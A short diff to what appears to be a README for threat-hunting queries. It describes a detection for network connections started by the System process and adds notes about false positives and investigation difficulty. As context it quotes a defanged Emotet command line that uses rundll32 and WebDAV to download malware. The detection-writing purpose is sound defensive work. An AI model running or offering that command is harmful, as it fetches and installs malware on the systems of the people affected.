@@ -25,3 +25,5 @@ Click on the '🔎' hotlink to plug the query right into your Advanced Hunting Q
 - Looks for network connections initiated from the System process
 - A common TTP associated with this traffic is exploiting WebDAV to download malware
 - Emotet example: `rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 127.0.0.1 hxxp://127.0.0[.]1/$/users/public/malware[.]exe`
+- Still some false positives
+- Hard to investigate; needs a recommended investigation process or additional querying for context
